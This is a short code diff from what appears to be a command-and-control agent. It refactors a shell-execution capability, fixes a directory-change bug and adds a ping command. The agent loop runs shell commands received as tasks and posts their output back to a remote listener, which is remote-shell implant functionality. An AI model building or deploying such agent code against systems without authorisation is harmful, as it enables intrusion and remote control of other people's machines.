@@ -15,10 +15,14 @@ RESULTS_URL_PATHS = ["/results"]
 REGISTRATION_URL_PATHS = ["/register"]
 
 
-def shell_capability(command, timeout, blind):
-    if command[:3].strip().lower() == "cd ":
+def shell_capability(arguments):
+    command = arguments["command"]
+    timeout = arguments["timeout"]
+    blind = arguments["blind"]
+
+    if command[:3].lstrip().lower() == "cd ":
         directory_to_change_to = command.replace("cd ", "", 1)
-        os.chdir(command)
+        os.chdir(directory_to_change_to)
         return {
             "success": True,
             "message": f"Changed to directory: {directory_to_change_to}",
@@ -42,6 +46,14 @@ def shell_capability(command, timeout, blind):
             "message": output,
             "data": {},
         }
+
+
+def ping_capability(_arguments):
+    return {
+        "success": True,
+        "message": "Pong!",
+        "data": {},
+    }
 
 
 class ModuleLoader:
@@ -230,11 +242,10 @@ class Agent:
             print(tasks)
             for task in tasks:
                 if task["command"] == "shell":
-                    result = shell_capability(
-                        task["arguments"]["command"],
-                        task["arguments"]["timeout"],
-                        task["arguments"]["blind"],
-                    )
+                    result = shell_capability(task["arguments"])
+                    self.connection.post_results_to_listener(task["task_id"], **result)
+                elif task["command"] == "ping":
+                    result = ping_capability(task["arguments"])
                     self.connection.post_results_to_listener(task["task_id"], **result)
 
                 # if task["command"] == "load_module":
